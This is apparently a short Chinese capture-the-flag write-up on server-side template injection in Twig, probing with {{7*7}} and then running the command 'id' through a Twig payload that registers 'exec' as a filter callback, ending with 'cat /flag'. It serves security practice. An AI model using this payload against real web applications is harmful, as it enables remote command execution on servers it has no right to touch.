知识点：

1. 模板注入ssit

2. twig模板注入

参考：

https://zhuanlan.zhihu.com/p/28823933



1. 和[BJDCTF2020]The mystery of ip类似，尝试模板注入

payload:

```javascript
{{7*7}}
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/C39677EE66C0403DAB952AA207A37E51clipboard.png)



2. 直接使用https://zhuanlan.zhihu.com/p/28823933里的twig模板注入，payload:

```javascript
 user={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```



![](https://raw.githubusercontent.com/h1iba1/h1iba1.github.io/refs/heads/master/_posts/CTF/CTFwriteup/buuctf练习笔记/images/9B831080F35044BE892AEB1C9374BCBEclipboard.png)

命令执行成功，只需要cat /flag即可得到flag